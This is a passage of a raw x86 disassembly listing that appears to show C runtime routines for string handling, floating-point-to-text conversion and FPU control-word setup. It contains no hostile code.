000017E5  C6460100          mov byte [esi+0x1],0x0
000017E9  5E                pop esi
000017EA  C3                ret
000017EB  90                nop
000017EC  90                nop
000017ED  90                nop
000017EE  90                nop
000017EF  90                nop
000017F0  8B442404          mov eax,[esp+0x4]
000017F4  8A08              mov cl,[eax]
000017F6  84C9              test cl,cl
000017F8  740D              jz 0x1807
000017FA  80F92E            cmp cl,0x2e
000017FD  7408              jz 0x1807
000017FF  8A4801            mov cl,[eax+0x1]
00001802  40                inc eax
00001803  84C9              test cl,cl
00001805  75F3              jnz 0x17fa
00001807  8A08              mov cl,[eax]
00001809  40                inc eax
0000180A  84C9              test cl,cl
0000180C  7446              jz 0x1854
0000180E  8A08              mov cl,[eax]
00001810  84C9              test cl,cl
00001812  7412              jz 0x1826
00001814  80F965            cmp cl,0x65
00001817  740D              jz 0x1826
00001819  80F945            cmp cl,0x45
0000181C  7408              jz 0x1826
0000181E  8A4801            mov cl,[eax+0x1]
00001821  40                inc eax
00001822  84C9              test cl,cl
00001824  75EE              jnz 0x1814
00001826  8A48FF            mov cl,[eax-0x1]
00001829  8BD0              mov edx,eax
0000182B  48                dec eax
0000182C  80F930            cmp cl,0x30
0000182F  7509              jnz 0x183a
00001831  8A48FF            mov cl,[eax-0x1]
00001834  48                dec eax
00001835  80F930            cmp cl,0x30
00001838  74F7              jz 0x1831
0000183A  80382E            cmp byte [eax],0x2e
0000183D  7501              jnz 0x1840
0000183F  48                dec eax
00001840  8A0A              mov cl,[edx]
00001842  40                inc eax
00001843  42                inc edx
00001844  84C9              test cl,cl
00001846  8808              mov [eax],cl
00001848  740A              jz 0x1854
0000184A  8A0A              mov cl,[edx]
0000184C  40                inc eax
0000184D  42                inc edx
0000184E  84C9              test cl,cl
00001850  8808              mov [eax],cl
00001852  75F6              jnz 0x184a
00001854  C3                ret
00001855  90                nop
00001856  90                nop
00001857  90                nop
00001858  90                nop
00001859  90                nop
0000185A  90                nop
0000185B  90                nop
0000185C  90                nop
0000185D  90                nop
0000185E  90                nop
0000185F  90                nop
00001860  8B4C2408          mov ecx,[esp+0x8]
00001864  8B542404          mov edx,[esp+0x4]
00001868  8D44240C          lea eax,[esp+0xc]
0000186C  50                push eax
0000186D  51                push ecx
0000186E  52                push edx
0000186F  E8BCEEFFFF        call 0x730
00001874  83C40C            add esp,byte +0xc
00001877  C3                ret
00001878  90                nop
00001879  90                nop
0000187A  90                nop
0000187B  90                nop
0000187C  90                nop
0000187D  90                nop
0000187E  90                nop
0000187F  90                nop
00001880  8B4C2404          mov ecx,[esp+0x4]
00001884  8A11              mov dl,[ecx]
00001886  8D4101            lea eax,[ecx+0x1]
00001889  84D2              test dl,dl
0000188B  7407              jz 0x1894
0000188D  8A10              mov dl,[eax]
0000188F  40                inc eax
00001890  84D2              test dl,dl
00001892  75F9              jnz 0x188d
00001894  2BC1              sub eax,ecx
00001896  48                dec eax
00001897  C3                ret
00001898  90                nop
00001899  90                nop
0000189A  90                nop
0000189B  90                nop
0000189C  90                nop
0000189D  90                nop
0000189E  90                nop
0000189F  90                nop
000018A0  E813000000        call 0x18b8
000018A5  E8BD000000        call 0x1967
000018AA  A3146D1E00        mov [0x1e6d14],eax
000018AF  E863000000        call 0x1917
000018B4  DBE2              fnclex
000018B6  C3                ret
000018B7  C3                ret
000018B8  B8401D1E00        mov eax,0x1e1d40
000018BD  C70528601E00EA19  mov dword [0x1e6028],0x1e19ea
         -1E00
000018C7  A324601E00        mov [0x1e6024],eax
000018CC  C7052C601E00501A  mov dword [0x1e602c],0x1e1a50
         -1E00
000018D6  C70530601E009019  mov dword [0x1e6030],0x1e1990
         -1E00
000018E0  C70534601E00381A  mov dword [0x1e6034],0x1e1a38
         -1E00
000018EA  A338601E00        mov [0x1e6038],eax
000018EF  C3                ret
000018F0  55                push ebp
000018F1  8BEC              mov ebp,esp
000018F3  83C4F4            add esp,byte -0xc
000018F6  9B                wait
000018F7  D97DFE            fnstcw [ebp-0x2]
000018FA  9B                wait
000018FB  668B45FE          mov ax,[ebp-0x2]
000018FF  80CC0C            or ah,0xc
00001902  668945FC          mov [ebp-0x4],ax
00001906  D96DFC            fldcw [ebp-0x4]
00001909  DF7DF4            fistp qword [ebp-0xc]
0000190C  D96DFE            fldcw [ebp-0x2]
0000190F  8B45F4            mov eax,[ebp-0xc]
00001912  8B55F8            mov edx,[ebp-0x8]
00001915  C9                leave
00001916  C3                ret
00001917  6800000300        push dword 0x30000
0000191C  6800000100        push dword 0x10000
00001921  E8C5040000        call 0x1deb
00001926  59                pop ecx
00001927  59                pop ecx
00001928  C3                ret
00001929  55                push ebp
0000192A  8BEC              mov ebp,esp
0000192C  83EC18            sub esp,byte +0x18
0000192F  DD0540571E00      fld qword [0x1e5740]
00001935  DD5DF8            fstp qword [ebp-0x8]
00001938  DD0538571E00      fld qword [0x1e5738]
0000193E  DD5DF0            fstp qword [ebp-0x10]
00001941  DD45F0            fld qword [ebp-0x10]
00001944  DC75F8            fdiv qword [ebp-0x8]
00001947  DC4DF8            fmul qword [ebp-0x8]
0000194A  DC6DF0            fsubr qword [ebp-0x10]
0000194D  DD5DE8            fstp qword [ebp-0x18]
00001950  DD45E8            fld qword [ebp-0x18]
00001953  DC1D10571E00      fcomp qword [0x1e5710]
00001959  DFE0              fnstsw ax
0000195B  9E                sahf
0000195C  7605              jna 0x1963
0000195E  6A01              push byte +0x1
00001960  58                pop eax
00001961  C9                leave
00001962  C3                ret
00001963  33C0              xor eax,eax
00001965  C9                leave
00001966  C3                ret
00001967  6864571E00        push dword 0x1e5764
0000196C  FF1594561E00      call near [0x1e5694]
00001972  85C0              test eax,eax
00001974  7415              jz 0x198b
00001976  6848571E00        push dword 0x1e5748
0000197B  50                push eax
0000197C  FF1590561E00      call near [0x1e5690]
00001982  85C0              test eax,eax
00001984  7405              jz 0x198b
00001986  6A00              push byte +0x0
00001988  FFD0              call eax
0000198A  C3                ret
0000198B  E999FFFFFF        jmp 0x1929
00001990  56                push esi
00001991  8B742408          mov esi,[esp+0x8]
00001995  0FBE06            movsx eax,byte [esi]
00001998  50                push eax
00001999  E8F3050000        call 0x1f91
0000199E  83F865            cmp eax,byte +0x65
000019A1  59                pop ecx
000019A2  742C              jz 0x19d0
000019A4  46                inc esi
000019A5  833D3C601E0001    cmp dword [0x1e603c],byte +0x1
000019AC  7E0F              jng 0x19bd
000019AE  0FBE06            movsx eax,byte [esi]
000019B1  6A04              push byte +0x4
000019B3  50                push eax
000019B4  E863050000        call 0x1f1c
000019B9  59                pop ecx
000019BA  59                pop ecx
000019BB  EB0F              jmp short 0x19cc
000019BD  0FBE06            movsx eax,byte [esi]
000019C0  8B0D48601E00      mov ecx,[0x1e6048]
000019C6  8A0441            mov al,[ecx+eax*2]
000019C9  83E004            and eax,byte +0x4
000019CC  85C0              test eax,eax
000019CE  75D4              jnz 0x19a4
000019D0  8A0D40601E00      mov cl,[0x1e6040]
000019D6  8A06              mov al,[esi]
000019D8  880E              mov [esi],cl
000019DA  46                inc esi
000019DB  8A0E              mov cl,[esi]
000019DD  8806              mov [esi],al
000019DF  8AC1              mov al,cl
000019E1  8A0E              mov cl,[esi]
000019E3  46                inc esi
000019E4  84C9              test cl,cl
000019E6  75F3              jnz 0x19db
000019E8  5E                pop esi
000019E9  C3                ret
000019EA  8B442404          mov eax,[esp+0x4]
000019EE  8A1540601E00      mov dl,[0x1e6040]
000019F4  8A08              mov cl,[eax]
000019F6  84C9              test cl,cl
000019F8  740C              jz 0x1a06
000019FA  3ACA              cmp cl,dl
000019FC  7408              jz 0x1a06
000019FE  8A4801            mov cl,[eax+0x1]
00001A01  40                inc eax
00001A02  84C9              test cl,cl
00001A04  75F4              jnz 0x19fa
00001A06  8A08              mov cl,[eax]
00001A08  40                inc eax
00001A09  84C9              test cl,cl
00001A0B  742A              jz 0x1a37
00001A0D  8A08              mov cl,[eax]
00001A0F  84C9              test cl,cl
00001A11  740D              jz 0x1a20
00001A13  80F965            cmp cl,0x65
00001A16  7408              jz 0x1a20
00001A18  80F945            cmp cl,0x45
00001A1B  7403              jz 0x1a20
00001A1D  40                inc eax
00001A1E  EBED              jmp short 0x1a0d
00001A20  8BC8              mov ecx,eax
00001A22  48                dec eax
00001A23  803830            cmp byte [eax],0x30
00001A26  74FA              jz 0x1a22
00001A28  3810              cmp [eax],dl
00001A2A  7501              jnz 0x1a2d
00001A2C  48                dec eax
00001A2D  8A11              mov dl,[ecx]
00001A2F  40                inc eax
00001A30  41                inc ecx
00001A31  84D2              test dl,dl
00001A33  8810              mov [eax],dl
00001A35  75F6              jnz 0x1a2d
00001A37  C3                ret
00001A38  8B442404          mov eax,[esp+0x4]
00001A3C  DD00              fld qword [eax]
00001A3E  DC1D08571E00      fcomp qword [0x1e5708]
00001A44  DFE0              fnstsw ax
00001A46  9E                sahf
00001A47  7204              jc 0x1a4d
00001A49  6A01              push byte +0x1
00001A4B  58                pop eax
00001A4C  C3                ret
00001A4D  33C0              xor eax,eax
00001A4F  C3                ret
00001A50  55                push ebp
00001A51  8BEC              mov ebp,esp
00001A53  51                push ecx
00001A54  51                push ecx
00001A55  837D0800          cmp dword [ebp+0x8],byte +0x0
00001A59  FF7510            push dword [ebp+0x10]
00001A5C  741B              jz 0x1a79
00001A5E  8D45F8            lea eax,[ebp-0x8]
00001A61  50                push eax
00001A62  E8F6090000        call 0x245d
00001A67  8B450C            mov eax,[ebp+0xc]
00001A6A  59                pop ecx
00001A6B  59                pop ecx
00001A6C  8B4DF8            mov ecx,[ebp-0x8]
00001A6F  8908              mov [eax],ecx
00001A71  8B4DFC            mov ecx,[ebp-0x4]
00001A74  894804            mov [eax+0x4],ecx
00001A77  C9                leave
00001A78  C3                ret
00001A79  8D4510            lea eax,[ebp+0x10]
00001A7C  50                push eax
00001A7D  E8080A0000        call 0x248a
00001A82  8B450C            mov eax,[ebp+0xc]
00001A85  59                pop ecx
00001A86  59                pop ecx
00001A87  8B4D10            mov ecx,[ebp+0x10]
00001A8A  8908              mov [eax],ecx
00001A8C  C9                leave
00001A8D  C3                ret
00001A8E  55                push ebp
00001A8F  8BEC              mov ebp,esp
00001A91  83EC28            sub esp,byte +0x28
00001A94  8D45D8            lea eax,[ebp-0x28]
00001A97  56                push esi
00001A98  50                push eax
00001A99  8D45F0            lea eax,[ebp-0x10]
00001A9C  50                push eax
00001A9D  8B4508            mov eax,[ebp+0x8]
00001AA0  51                push ecx
00001AA1  51                push ecx
00001AA2  DD00              fld qword [eax]
00001AA4  DD1C24            fstp qword [esp]
00001AA7  E8820A0000        call 0x252e
00001AAC  8B7510            mov esi,[ebp+0x10]
00001AAF  8D45F0            lea eax,[ebp-0x10]
00001AB2  50                push eax
00001AB3  8B550C            mov edx,[ebp+0xc]
00001AB6  8D4601            lea eax,[esi+0x1]
00001AB9  50                push eax
00001ABA  33C0              xor eax,eax
00001ABC  837DF02D          cmp dword [ebp-0x10],byte +0x2d
00001AC0  0F94C0            setz al
00001AC3  33C9              xor ecx,ecx
00001AC5  85F6              test esi,esi
00001AC7  0F9FC1            setg cl
00001ACA  03D0              add edx,eax
00001ACC  03CA              add ecx,edx
00001ACE  51                push ecx
00001ACF  E8E3090000        call 0x24b7
00001AD4  8D45F0            lea eax,[ebp-0x10]
00001AD7  6A00              push byte +0x0
00001AD9  50                push eax
00001ADA  FF7514            push dword [ebp+0x14]
00001ADD  56                push esi
00001ADE  FF750C            push dword [ebp+0xc]
00001AE1  E809000000        call 0x1aef
00001AE6  8B450C            mov eax,[ebp+0xc]
00001AE9  83C430            add esp,byte +0x30
00001AEC  5E                pop esi
00001AED  C9                leave
00001AEE  C3                ret
00001AEF  55                push ebp
00001AF0  8BEC              mov ebp,esp
00001AF2  53                push ebx
00001AF3  33DB              xor ebx,ebx
00001AF5  385D18            cmp [ebp+0x18],bl
00001AF8  56                push esi
00001AF9  8B7514            mov esi,[ebp+0x14]
00001AFC  57                push edi
00001AFD  8B7D08            mov edi,[ebp+0x8]
00001B00  741B              jz 0x1b1d
00001B02  33C0              xor eax,eax
00001B04  395D0C            cmp [ebp+0xc],ebx
00001B07  0F9FC0            setg al
00001B0A  50                push eax
00001B0B  33C0              xor eax,eax
00001B0D  833E2D            cmp dword [esi],byte +0x2d
00001B10  0F94C0            setz al
00001B13  03C7              add eax,edi
00001B15  50                push eax
00001B16  E876020000        call 0x1d91
00001B1B  59                pop ecx
00001B1C  59                pop ecx
00001B1D  833E2D            cmp dword [esi],byte +0x2d
00001B20  8BC7              mov eax,edi
00001B22  7506              jnz 0x1b2a
00001B24  C6072D            mov byte [edi],0x2d
00001B27  8D4701            lea eax,[edi+0x1]
00001B2A  395D0C            cmp [ebp+0xc],ebx
00001B2D  7E12              jng 0x1b41
00001B2F  8A5001            mov dl,[eax+0x1]
00001B32  8D4801            lea ecx,[eax+0x1]
00001B35  8810              mov [eax],dl
00001B37  8BC1              mov eax,ecx
00001B39  8A0D40601E00      mov cl,[0x1e6040]
00001B3F  8808              mov [eax],cl
00001B41  33C9              xor ecx,ecx
00001B43  385D18            cmp [ebp+0x18],bl
00001B46  6870571E00        push dword 0x1e5770
00001B4B  0F94C1            setz cl
00001B4E  03C8              add ecx,eax
00001B50  034D0C            add ecx,[ebp+0xc]
00001B53  51                push ecx
00001B54  E8E70A0000        call 0x2640
00001B59  395D10            cmp [ebp+0x10],ebx
00001B5C  59                pop ecx
00001B5D  59                pop ecx
00001B5E  8BC8              mov ecx,eax
00001B60  7403              jz 0x1b65
00001B62  C60145            mov byte [ecx],0x45
00001B65  8B460C            mov eax,[esi+0xc]
00001B68  41                inc ecx
00001B69  803830            cmp byte [eax],0x30
00001B6C  743C              jz 0x1baa
00001B6E  8B5E04            mov ebx,[esi+0x4]
00001B71  4B                dec ebx
00001B72  7905              jns 0x1b79
00001B74  F7DB              neg ebx
00001B76  C6012D            mov byte [ecx],0x2d
00001B79  41                inc ecx
00001B7A  83FB64            cmp ebx,byte +0x64
00001B7D  7C11              jl 0x1b90
00001B7F  8BC3              mov eax,ebx
00001B81  6A64              push byte +0x64
00001B83  99                cdq
00001B84  5E                pop esi
00001B85  F7FE              idiv esi
00001B87  0001              add [ecx],al
00001B89  8BC3              mov eax,ebx
00001B8B  99                cdq
00001B8C  F7FE              idiv esi
00001B8E  8BDA              mov ebx,edx
00001B90  41                inc ecx
00001B91  83FB0A            cmp ebx,byte +0xa
00001B94  7C11              jl 0x1ba7
00001B96  8BC3              mov eax,ebx
00001B98  6A0A              push byte +0xa
00001B9A  99                cdq
00001B9B  5E                pop esi
00001B9C  F7FE              idiv esi
00001B9E  0001              add [ecx],al
00001BA0  8BC3              mov eax,ebx
00001BA2  99                cdq
00001BA3  F7FE              idiv esi
00001BA5  8BDA              mov ebx,edx
00001BA7  005901            add [ecx+0x1],bl
00001BAA  8BC7              mov eax,edi
00001BAC  5F                pop edi
00001BAD  5E                pop esi
00001BAE  5B                pop ebx
00001BAF  5D                pop ebp
00001BB0  C3                ret
00001BB1  55                push ebp
00001BB2  8BEC              mov ebp,esp
00001BB4  83EC28            sub esp,byte +0x28
00001BB7  8D45D8            lea eax,[ebp-0x28]
00001BBA  56                push esi
00001BBB  50                push eax
00001BBC  8D45F0            lea eax,[ebp-0x10]
00001BBF  50                push eax
00001BC0  8B4508            mov eax,[ebp+0x8]
00001BC3  51                push ecx
00001BC4  51                push ecx
00001BC5  DD00              fld qword [eax]
00001BC7  DD1C24            fstp qword [esp]
00001BCA  E85F090000        call 0x252e
00001BCF  8B7510            mov esi,[ebp+0x10]
00001BD2  8D45F0            lea eax,[ebp-0x10]
00001BD5  50                push eax
00001BD6  8B45F4            mov eax,[ebp-0xc]
00001BD9  03C6              add eax,esi
00001BDB  50                push eax
00001BDC  33C0              xor eax,eax
00001BDE  837DF02D          cmp dword [ebp-0x10],byte +0x2d
00001BE2  0F94C0            setz al
00001BE5  03450C            add eax,[ebp+0xc]
00001BE8  50                push eax
00001BE9  E8C9080000        call 0x24b7
00001BEE  8D45F0            lea eax,[ebp-0x10]
00001BF1  6A00              push byte +0x0
00001BF3  50                push eax
00001BF4  56                push esi
00001BF5  FF750C            push dword [ebp+0xc]
00001BF8  E809000000        call 0x1c06
00001BFD  8B450C            mov eax,[ebp+0xc]
00001C00  83C42C            add esp,byte +0x2c
00001C03  5E                pop esi
00001C04  C9                leave
00001C05  C3                ret
00001C06  55                push ebp
00001C07  8BEC              mov ebp,esp
00001C09  53                push ebx
00001C0A  56                push esi
00001C0B  8B7510            mov esi,[ebp+0x10]
00001C0E  8B5D08            mov ebx,[ebp+0x8]
00001C11  57                push edi
00001C12  8B4604            mov eax,[esi+0x4]
00001C15  48                dec eax
00001C16  807D1400          cmp byte [ebp+0x14],0x0
00001C1A  741A              jz 0x1c36
00001C1C  3B450C            cmp eax,[ebp+0xc]
00001C1F  7515              jnz 0x1c36
00001C21  33C9              xor ecx,ecx
00001C23  833E2D            cmp dword [esi],byte +0x2d
00001C26  0F94C1            setz cl
00001C29  03C8              add ecx,eax
00001C2B  03CB              add ecx,ebx
00001C2D  8BC1              mov eax,ecx
00001C2F  C60030            mov byte [eax],0x30
00001C32  80600100          and byte [eax+0x1],0x0
00001C36  833E2D            cmp dword [esi],byte +0x2d
00001C39  8BFB              mov edi,ebx
00001C3B  7506              jnz 0x1c43
00001C3D  C6032D            mov byte [ebx],0x2d
00001C40  8D7B01            lea edi,[ebx+0x1]
00001C43  8B4604            mov eax,[esi+0x4]
00001C46  85C0              test eax,eax
00001C48  7F10              jg 0x1c5a
00001C4A  6A01              push byte +0x1
00001C4C  57                push edi
00001C4D  E83F010000        call 0x1d91
00001C52  59                pop ecx
00001C53  C60730            mov byte [edi],0x30
00001C56  59                pop ecx
00001C57  47                inc edi
00001C58  EB02              jmp short 0x1c5c
00001C5A  03F8              add edi,eax
00001C5C  837D0C00          cmp dword [ebp+0xc],byte +0x0
00001C60  7E44              jng 0x1ca6
00001C62  6A01              push byte +0x1
00001C64  57                push edi
00001C65  E827010000        call 0x1d91
00001C6A  A040601E00        mov al,[0x1e6040]
00001C6F  59                pop ecx
00001C70  8807              mov [edi],al
00001C72  8B7604            mov esi,[esi+0x4]
00001C75  47                inc edi
00001C76  59                pop ecx
00001C77  85F6              test esi,esi
00001C79  7D2B              jnl 0x1ca6
00001C7B  807D1400          cmp byte [ebp+0x14],0x0
00001C7F  7404              jz 0x1c85
00001C81  F7DE              neg esi
00001C83  EB07              jmp short 0x1c8c
00001C85  F7DE              neg esi
00001C87  39750C            cmp [ebp+0xc],esi
00001C8A  7C03              jl 0x1c8f
00001C8C  89750C            mov [ebp+0xc],esi
00001C8F  FF750C            push dword [ebp+0xc]
00001C92  57                push edi
00001C93  E8F9000000        call 0x1d91
00001C98  FF750C            push dword [ebp+0xc]
00001C9B  6A30              push byte +0x30
00001C9D  57                push edi
00001C9E  E88D0A0000        call 0x2730
00001CA3  83C414            add esp,byte +0x14
00001CA6  5F                pop edi
00001CA7  8BC3              mov eax,ebx
00001CA9  5E                pop esi
00001CAA  5B                pop ebx
00001CAB  5D                pop ebp
00001CAC  C3                ret
00001CAD  55                push ebp
00001CAE  8BEC              mov ebp,esp
00001CB0  83EC28            sub esp,byte +0x28
00001CB3  53                push ebx
00001CB4  56                push esi
00001CB5  8D45D8            lea eax,[ebp-0x28]
00001CB8  57                push edi
00001CB9  50                push eax
00001CBA  8D45F0            lea eax,[ebp-0x10]
00001CBD  50                push eax
00001CBE  8B4508            mov eax,[ebp+0x8]
00001CC1  51                push ecx
00001CC2  51                push ecx
00001CC3  DD00              fld qword [eax]
00001CC5  DD1C24            fstp qword [esp]
00001CC8  E861080000        call 0x252e
00001CCD  8B45F4            mov eax,[ebp-0xc]
00001CD0  8B5D10            mov ebx,[ebp+0x10]
00001CD3  8D70FF            lea esi,[eax-0x1]
00001CD6  33C0              xor eax,eax
00001CD8  837DF02D          cmp dword [ebp-0x10],byte +0x2d
00001CDC  0F94C0            setz al
00001CDF  03450C            add eax,[ebp+0xc]
00001CE2  8BF8              mov edi,eax
00001CE4  8D45F0            lea eax,[ebp-0x10]
00001CE7  50                push eax
00001CE8  53                push ebx
00001CE9  57                push edi
00001CEA  E8C8070000        call 0x24b7
00001CEF  8B45F4            mov eax,[ebp-0xc]
00001CF2  83C41C            add esp,byte +0x1c
00001CF5  48                dec eax
00001CF6  3BF0              cmp esi,eax
00001CF8  0F9CC1            setl cl
00001CFB  83F8FC            cmp eax,byte -0x4
00001CFE  7C26              jl 0x1d26
00001D00  3BC3              cmp eax,ebx
00001D02  7D22              jnl 0x1d26
00001D04  84C9              test cl,cl
00001D06  740A              jz 0x1d12
00001D08  8A07              mov al,[edi]
00001D0A  47                inc edi
00001D0B  84C0              test al,al
00001D0D  75F9              jnz 0x1d08
00001D0F  2047FE            and [edi-0x2],al
00001D12  8D45F0            lea eax,[ebp-0x10]
00001D15  6A01              push byte +0x1
00001D17  50                push eax
00001D18  53                push ebx
00001D19  FF750C            push dword [ebp+0xc]
00001D1C  E8E5FEFFFF        call 0x1c06
00001D21  83C410            add esp,byte +0x10
00001D24  EB15              jmp short 0x1d3b
00001D26  8D45F0            lea eax,[ebp-0x10]
00001D29  6A01              push byte +0x1
00001D2B  50                push eax
00001D2C  FF7514            push dword [ebp+0x14]
00001D2F  53                push ebx
00001D30  FF750C            push dword [ebp+0xc]
00001D33  E8B7FDFFFF        call 0x1aef
00001D38  83C414            add esp,byte +0x14
00001D3B  5F                pop edi
00001D3C  5E                pop esi
00001D3D  5B                pop ebx
00001D3E  C9                leave
00001D3F  C3                ret
00001D40  55                push ebp
00001D41  8BEC              mov ebp,esp
00001D43  837D1065          cmp dword [ebp+0x10],byte +0x65
00001D47  7432              jz 0x1d7b
00001D49  837D1045          cmp dword [ebp+0x10],byte +0x45
00001D4D  742C              jz 0x1d7b
00001D4F  837D1066          cmp dword [ebp+0x10],byte +0x66
00001D53  7513              jnz 0x1d68
00001D55  FF7514            push dword [ebp+0x14]
00001D58  FF750C            push dword [ebp+0xc]
00001D5B  FF7508            push dword [ebp+0x8]
00001D5E  E84EFEFFFF        call 0x1bb1
00001D63  83C40C            add esp,byte +0xc
00001D66  5D                pop ebp
00001D67  C3                ret
00001D68  FF7518            push dword [ebp+0x18]
00001D6B  FF7514            push dword [ebp+0x14]
00001D6E  FF750C            push dword [ebp+0xc]
00001D71  FF7508            push dword [ebp+0x8]
00001D74  E834FFFFFF        call 0x1cad
00001D79  EB11              jmp short 0x1d8c
00001D7B  FF7518            push dword [ebp+0x18]
00001D7E  FF7514            push dword [ebp+0x14]
00001D81  FF750C            push dword [ebp+0xc]
00001D84  FF7508            push dword [ebp+0x8]
00001D87  E802FDFFFF        call 0x1a8e
00001D8C  83C410            add esp,byte +0x10
00001D8F  5D                pop ebp
00001D90  C3                ret
00001D91  57                push edi
00001D92  8B7C240C          mov edi,[esp+0xc]
00001D96  85FF              test edi,edi
00001D98  741A              jz 0x1db4
00001D9A  56                push esi
00001D9B  8B74240C          mov esi,[esp+0xc]
00001D9F  56                push esi
00001DA0  E82B0D0000        call 0x2ad0
00001DA5  40                inc eax
00001DA6  50                push eax
00001DA7  56                push esi
00001DA8  03F7              add esi,edi
00001DAA  56                push esi
00001DAB  E8E0090000        call 0x2790
00001DB0  83C410            add esp,byte +0x10
00001DB3  5E                pop esi
00001DB4  5F                pop edi
00001DB5  C3                ret
00001DB6  55                push ebp
00001DB7  8BEC              mov ebp,esp
00001DB9  51                push ecx
00001DBA  56                push esi
00001DBB  9B                wait
00001DBC  D97DFC            fnstcw [ebp-0x4]
00001DBF  FF75FC            push dword [ebp-0x4]
00001DC2  E83A000000        call 0x1e01
00001DC7  8BF0              mov esi,eax
00001DC9  8B450C            mov eax,[ebp+0xc]
00001DCC  F7D0              not eax
00001DCE  23F0              and esi,eax
00001DD0  8B4508            mov eax,[ebp+0x8]
00001DD3  23450C            and eax,[ebp+0xc]
00001DD6  0BF0              or esi,eax
00001DD8  56                push esi
00001DD9  E8B5000000        call 0x1e93
00001DDE  59                pop ecx
00001DDF  89450C            mov [ebp+0xc],eax
00001DE2  59                pop ecx
00001DE3  D96D0C            fldcw [ebp+0xc]
00001DE6  8BC6              mov eax,esi
00001DE8  5E                pop esi
00001DE9  C9                leave
00001DEA  C3                ret
00001DEB  8B442408          mov eax,[esp+0x8]
00001DEF  25FFFFF7FF        and eax,0xfff7ffff
00001DF4  50                push eax
00001DF5  FF742408          push dword [esp+0x8]
00001DF9  E8B8FFFFFF        call 0x1db6
00001DFE  59                pop ecx
00001DFF  59                pop ecx
00001E00  C3                ret
00001E01  53                push ebx
00001E02  8B5C2408          mov ebx,[esp+0x8]
00001E06  33C0              xor eax,eax
00001E08  55                push ebp
00001E09  F6C301            test bl,0x1
00001E0C  57                push edi
00001E0D  7403              jz 0x1e12
00001E0F  6A10              push byte +0x10
00001E11  58                pop eax
00001E12  F6C304            test bl,0x4
00001E15  7402              jz 0x1e19
00001E17  0C08              or al,0x8
00001E19  F6C308            test bl,0x8
00001E1C  7402              jz 0x1e20
00001E1E  0C04              or al,0x4
00001E20  F6C310            test bl,0x10
00001E23  7402              jz 0x1e27
00001E25  0C02              or al,0x2
00001E27  F6C320            test bl,0x20
00001E2A  7402              jz 0x1e2e
00001E2C  0C01              or al,0x1
00001E2E  F6C302            test bl,0x2
00001E31  7405              jz 0x1e38
00001E33  0D00000800        or eax,0x80000
00001E38  0FB7CB            movzx ecx,bx
00001E3B  56                push esi
00001E3C  8BD1              mov edx,ecx
00001E3E  BE000C0000        mov esi,0xc00
00001E43  BF00030000        mov edi,0x300
00001E48  23D6              and edx,esi
00001E4A  BD00020000        mov ebp,0x200
00001E4F  741F              jz 0x1e70
00001E51  81FA00040000      cmp edx,0x400
00001E57  7414              jz 0x1e6d
00001E59  81FA00080000      cmp edx,0x800
00001E5F  7408              jz 0x1e69
00001E61  3BD6              cmp edx,esi
00001E63  750B              jnz 0x1e70
00001E65  0BC7              or eax,edi
00001E67  EB07              jmp short 0x1e70
00001E69  0BC5              or eax,ebp
00001E6B  EB03              jmp short 0x1e70
00001E6D  80CC01            or ah,0x1
00001E70  23CF              and ecx,edi
00001E72  5E                pop esi
00001E73  740B              jz 0x1e80
00001E75  3BCD              cmp ecx,ebp
00001E77  750C              jnz 0x1e85
00001E79  0D00000100        or eax,0x10000
00001E7E  EB05              jmp short 0x1e85
00001E80  0D00000200        or eax,0x20000
00001E85  5F                pop edi
00001E86  5D                pop ebp
00001E87  F6C710            test bh,0x10
00001E8A  5B                pop ebx
00001E8B  7405              jz 0x1e92
00001E8D  0D00000400        or eax,0x40000
00001E92  C3                ret
00001E93  53                push ebx
00001E94  8B5C2408          mov ebx,[esp+0x8]
00001E98  33C0              xor eax,eax
00001E9A  56                push esi
00001E9B  F6C310            test bl,0x10
00001E9E  7403              jz 0x1ea3
00001EA0  6A01              push byte +0x1
00001EA2  58                pop eax
00001EA3  F6C308            test bl,0x8
00001EA6  7402              jz 0x1eaa
00001EA8  0C04              or al,0x4
00001EAA  F6C304            test bl,0x4
00001EAD  7402              jz 0x1eb1
00001EAF  0C08              or al,0x8
00001EB1  F6C302            test bl,0x2
00001EB4  7402              jz 0x1eb8
00001EB6  0C10              or al,0x10
00001EB8  F6C301            test bl,0x1
00001EBB  7402              jz 0x1ebf
00001EBD  0C20              or al,0x20
00001EBF  F7C300000800      test ebx,0x80000
00001EC5  7402              jz 0x1ec9
00001EC7  0C02              or al,0x2
00001EC9  8BCB              mov ecx,ebx
00001ECB  BA00030000        mov edx,0x300
00001ED0  23CA              and ecx,edx
00001ED2  BE00020000        mov esi,0x200
00001ED7  741D              jz 0x1ef6
00001ED9  81F900010000      cmp ecx,0x100
00001EDF  7412              jz 0x1ef3
00001EE1  3BCE              cmp ecx,esi
00001EE3  7409              jz 0x1eee
00001EE5  3BCA              cmp ecx,edx
00001EE7  750D              jnz 0x1ef6
00001EE9  80CC0C            or ah,0xc
00001EEC  EB08              jmp short 0x1ef6
00001EEE  80CC08            or ah,0x8
00001EF1  EB03              jmp short 0x1ef6
00001EF3  80CC04            or ah,0x4
00001EF6  8BCB              mov ecx,ebx
00001EF8  81E100000300      and ecx,0x30000
00001EFE  740C              jz 0x1f0c
00001F00  81F900000100      cmp ecx,0x10000
00001F06  7506              jnz 0x1f0e
00001F08  0BC6              or eax,esi
00001F0A  EB02              jmp short 0x1f0e
00001F0C  0BC2              or eax,edx
00001F0E  5E                pop esi
00001F0F  F7C300000400      test ebx,0x40000
00001F15  5B                pop ebx
00001F16  7403              jz 0x1f1b
00001F18  80CC10            or ah,0x10
00001F1B  C3                ret
00001F1C  55                push ebp
00001F1D  8BEC              mov ebp,esp
00001F1F  51                push ecx
00001F20  8B4508            mov eax,[ebp+0x8]
00001F23  8D4801            lea ecx,[eax+0x1]
00001F26  81F900010000      cmp ecx,0x100
00001F2C  770C              ja 0x1f3a
00001F2E  8B0D48601E00      mov ecx,[0x1e6048]
00001F34  0FB70441          movzx eax,word [ecx+eax*2]
00001F38  EB52              jmp short 0x1f8c
00001F3A  8BC8              mov ecx,eax
00001F3C  56                push esi
00001F3D  8B3548601E00      mov esi,[0x1e6048]
00001F43  C1F908            sar ecx,0x8
00001F46  0FB6D1            movzx edx,cl
00001F49  F644560180        test byte [esi+edx*2+0x1],0x80
00001F4E  5E                pop esi
00001F4F  740E              jz 0x1f5f
00001F51  8065FE00          and byte [ebp-0x2],0x0
00001F55  884DFC            mov [ebp-0x4],cl
00001F58  8845FD            mov [ebp-0x3],al
00001F5B  6A02              push byte +0x2
00001F5D  EB09              jmp short 0x1f68
00001F5F  8065FD00          and byte [ebp-0x3],0x0
00001F63  8845FC            mov [ebp-0x4],al
00001F66  6A01              push byte +0x1
00001F68  58                pop eax
